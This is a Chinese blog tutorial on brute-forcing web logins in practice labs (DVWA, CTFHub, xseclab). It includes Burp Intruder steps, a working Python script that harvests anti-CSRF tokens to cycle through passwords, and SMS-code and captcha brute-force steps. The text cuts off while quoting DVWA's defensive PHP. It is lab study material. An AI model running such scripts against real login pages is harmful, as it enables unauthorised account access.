<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="alternate" href="/rss.xml" title="少即是多，慢即是快" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="少即是多，慢即是快" type="application/atom+xml"><link rel="alternate" type="application/json" title="少即是多，慢即是快" href="https://ph0ven1x.github.io/feed.json"><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.2"><link rel="modulepreload" href="/js/chunk-35ELGMRU.js"><link rel="modulepreload" href="/js/chunk-52NF4PVE.js"><link rel="modulepreload" href="/js/chunk-MDK4KVSQ.js"><link rel="modulepreload" href="/js/chunk-XWLQ2736.js"><link rel="modulepreload" href="/js/index.esm-YD6Q2FEL.js"><link rel="modulepreload" href="/js/post-WGMRFXOO.js"><link rel="modulepreload" href="/js/quicklink-24QY5EII.js"><link rel="modulepreload" href="/js/search-6BFXGXPD.js"><link rel="modulepreload" href="/js/siteInit.js"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="4" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="7" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="E" as="image" fetchpriority="high"><link rel="preload" href="6" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="A" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="B" as="image" fetchpriority="high"><link rel="preload" href="4" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="E" as="image" fetchpriority="high"><link rel="preload" href="5" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="8" as="image" fetchpriority="high"><link rel="preload" href="A" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="B" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="E" as="image" fetchpriority="high"><link rel="preload" href="7" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="A" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="B" as="image" fetchpriority="high"><link rel="preload" href="4" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="E" as="image" fetchpriority="high"><link rel="preload" href="8" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="A" as="image" fetchpriority="high"><link rel="preload" href="7" as="image" fetchpriority="high"><link rel="preload" href="%" as="image" fetchpriority="high"><link rel="preload" href="A" as="image" fetchpriority="high"><link rel="preload" href="3" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="b" as="image" fetchpriority="high"><link rel="preload" href="r" as="image" fetchpriority="high"><link rel="preload" href="u" as="image" fetchpriority="high"><link rel="preload" href="t" as="image" fetchpriority="high"><link rel="preload" href="e" as="image" fetchpriority="high"><link rel="preload" href="." as="image" fetchpriority="high"><link rel="preload" href="j" as="image" fetchpriority="high"><link rel="preload" href="p" as="image" fetchpriority="high"><link rel="preload" href="g" as="image" fetchpriority="high"><meta name="keywords" content="Web安全,"><meta name="description" content="对暴力破解的一些总结"><link rel="canonical" href="https://ph0ven1x.github.io/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"><title>暴力破解</title><meta name="generator" content="Hexo 7.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">暴力破解</h1><div class="meta"><span class="item" title="创建时间：2024-07-09 23:57:11"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2024-07-09T23:57:11+08:00">2024-07-09</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>19k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>17 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ph0ven1x</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/brute.jpg" loading="eager" decoding="async" fetchpriority="high" alt="少即是多，慢即是快"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于Web安全"><span itemprop="name">Web安全<meta itemprop="position" content="0"></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://ph0ven1x.github.io/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"><meta itemprop="name" content="ph0ven1x"><meta itemprop="description" content=", 热爱技术，热爱生活"></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="少即是多，慢即是快"></span><div class="body md" itemprop="articleBody"><h1 id="爆破破解"><a class="anchor" href="#爆破破解">#</a> 爆破破解</h1>
<h2 id="web认证爆破"><a class="anchor" href="#web认证爆破">#</a> Web 认证爆破</h2>
<h3 id="基础爆破"><a class="anchor" href="#基础爆破">#</a> 基础爆破</h3>
<p><strong>DVWA 爆破模块难度：low、medium</strong></p>
<p>难度 low：没有任何防爆破措施，没有对用户名和密码的输入进行过滤，使用 GET 登录安全性低。</p>
<p>难度 meidium：防爆方面只做了延时，增加了爆破时间但依旧能爆破，对用户名和密码的输入进行了过滤，使用 GET 登录安全性低。</p>
<p><img loading="lazy" data-src="image-20240710173011134.png" alt="image-20240710173011134"></p>
<p><img loading="lazy" data-src="image-20240710173152804.png" alt="image-20240710173152804"></p>
<h3 id="basic认证爆破"><a class="anchor" href="#basic认证爆破">#</a> Basic 认证爆破</h3>
<p>靶场地址：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a></p>
<p>靶场位置：<strong>技能树 --&gt;Web--&gt;Web 前置技能 --&gt;HTTP 协议 ---&gt; 基础认证</strong></p>
<p><img loading="lazy" data-src="image-20240710173812961.png" alt="image-20240710173812961"></p>
<p>Basic 认证的特征: <code> Authorization：Basic 用户名:密码(base64加密)</code> 。</p>
<p><img loading="lazy" data-src="image-20240710173932677.png" alt="image-20240710173932677"></p>
<p><img loading="lazy" data-src="image-20240710174013818.png" alt="image-20240710174013818"></p>
<p><img loading="lazy" data-src="image-20240710174042171.png" alt="image-20240710174042171"></p>
<p>发送到 Intruder，攻击模式：Sniper，负载位置选择 <code>用户名:密码 </code> 。</p>
<p><img loading="lazy" data-src="image-20240710174150101.png" alt="image-20240710174150101"></p>
<p>payload 类型选择 Custom Iterator （自定义迭代器）迭代器位置 1 设置成用户名 admin，用 <code>:</code>  分割，同时 payload 配置为 Base64 加密。</p>
<p><img loading="lazy" data-src="image-20240710175518863.png" alt="image-20240710175518863"></p>
<p>位置 2 导入密码即可，开始攻击，注意把 payload encoding 关掉。</p>
<p><img loading="lazy" data-src="image-20240710175604210.png" alt="image-20240710175604210"></p>
<p>长度最短的就是正确的用户名和密码，得到 flag。</p>
<p><img loading="lazy" data-src="image-20240710175647008.png" alt="image-20240710175647008"></p>
<p>右键进行 Base64 解密，可以看到真实的用户名和密码。</p>
<p><img loading="lazy" data-src="image-20240710175715868.png" alt="image-20240710175715868"></p>
<h3 id="带token爆破"><a class="anchor" href="#带token爆破">#</a> 带 token 爆破</h3>
<p><strong>DVWA 暴力破解模块 - high</strong></p>
<p>先说第一种方案，使用 BurpSuite 来爆破。</p>
<p>抓包发送到 intruder 模块，攻击类型选择 Pitchfork，将密码和 token 配置为 payload positions。</p>
<p><img loading="lazy" data-src="image-20240710210907703.png" alt="image-20240710210907703"></p>
<p>然后在 setting 中找到 Grep -Extract 功能，抓取响应包，双击 token 值点击 ok，就能自动在爆破中抓取 token 值</p>
<p><img loading="lazy" data-src="image-20240710211302711.png" alt="image-20240710211302711"></p>
<p>在 settings 中找到 Redirections，选择 Always，总是跟随重定向。</p>
<p><img loading="lazy" data-src="image-20240710211411672.png" alt="image-20240710211411672"></p>
<p>在 Resource pool 中配置线程，这里只能使用单线程，因为 token 要一次一次从响应包中抓取，这次抓取的 token，用于下次尝试登录。</p>
<p><img loading="lazy" data-src="image-20240710211503741.png" alt="image-20240710211503741"></p>
<p>第一个 payload 导入密码字典，密码字典设两个空密码用于防止爆破时遗漏第一个密码，后面爆破时就能看到效果。</p>
<p><img loading="lazy" data-src="image-20240710211052235.png" alt="image-20240710211052235"></p>
<p>第二个 payload 是 token，用的是抓取的 token 值，payload type 选择 Recursive grep。</p>
<p><img loading="lazy" data-src="image-20240710211601607.png" alt="image-20240710211601607"></p>
<p>这里就能看到之前留空密码的作用。</p>
<p><img loading="lazy" data-src="image-20240710211826175.png" alt="image-20240710211826175"></p>
<p>Length 最长的就是真实密码。</p>
<p><img loading="lazy" data-src="image-20240710211909128.png" alt="image-20240710211909128"></p>
<p>第二种方案，编写 python 脚本来爆破</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_token</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers_index<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers_index<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="7"></td><td><pre>    pattern <span class="token operator">=</span> <span class="token string">r"&lt;input type='hidden' name='user_token' value='(.*?)' />"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> html<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        user_token <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span> user_token</pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'未找到user_token'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">None</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">def</span> <span class="token function">brute</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers_index<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password_path<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">if</span> get_token<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers_index<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">return</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>password_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            lines <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">for</span> password <span class="token keyword">in</span> lines<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            user_token <span class="token operator">=</span> get_token<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers_index<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?username=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">&amp;password=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">&amp;Login=Login&amp;user_token=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                headers<span class="token operator">=</span>headers_index<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            match1 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'welcome'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            match2 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>username <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> user_token<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token keyword">if</span> match1 <span class="token keyword">or</span> match2<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'暴力破解成功！！！'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"用户名："</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"\n密码："</span> <span class="token operator">+</span> password<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    headers_index <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate, br'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.9'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=2g9qv1v696bifnqv2uc6j71iq5; security=high'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'http://192.168.23.129:8001/vulnerabilities/brute/index.php'</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    password_path <span class="token operator">=</span> <span class="token string">"top1000.txt"</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    username <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    brute<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers_index<span class="token operator">=</span>headers_index<span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> password_path<span class="token operator">=</span>password_path<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711094713556.png" alt="image-20240711094713556"></p>
<h3 id="带图片验证码爆破"><a class="anchor" href="#带图片验证码爆破">#</a> 带图片验证码爆破</h3>
<p>靶场地址：<a target="_blank" rel="noopener" href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php">http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php</a></p>
<p><img loading="lazy" data-src="image-20240711095018227.png" alt="image-20240711095018227"></p>
<p>爆破手机验证码 (3 位数字)，识别数字验证码</p>
<p>工具 PKAV HTTP Fuzzer：<a target="_blank" rel="noopener" href="https://github.com/estell-yf/PKAV">https://github.com/estell-yf/PKAV</a></p>
<p>使用 python 编写脚本，生成 3 位数字手机验证码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"dic.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token keyword">for</span> z <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>y<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>z<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>先点击获取手机验证码，然后随便输入手机验证码和验证码，用 bp 抓包，将请求包复制到 pkav 的变体设置中，标记好手机验证码和图片验证码，导入生成的手机验证码字典</p>
<p><img loading="lazy" data-src="image-20240711104036951.png" alt="image-20240711104036951"></p>
<p>复制图片验证码的图片地址，粘贴到 pkav 的图片验证码识别模块中，点击设别测试，测试是否能识别成功</p>
<p><img loading="lazy" data-src="image-20240711104333506.png" alt="image-20240711104333506"></p>
<p>选择 pkav 的重放选择，验证码识别重放模式设置为单线程，验证码长度固定 4 位</p>
<p><img loading="lazy" data-src="image-20240711104606909.png" alt="image-20240711104606909"></p>
<p>进入 pkav 的发包器模块，粘贴目标网址，点击启动，遍历完后，选择长度最短的即为正确的验证码，点击返回包得到 flag。</p>
<p><img loading="lazy" data-src="image-20240711104958004.png" alt="image-20240711104958004"></p>
<h3 id="暴力破解防护措施"><a class="anchor" href="#暴力破解防护措施">#</a> 暴力破解防护措施</h3>
<p>参考一下 DVWA 暴力破解模块 - impossible 的代码</p>
<p><strong>DVWA 暴力破解模块 - impossible</strong></p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// Check Anti-CSRF token</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// Sanitise username input</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$user</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 去反斜杠</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">// Sanitise password input</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token 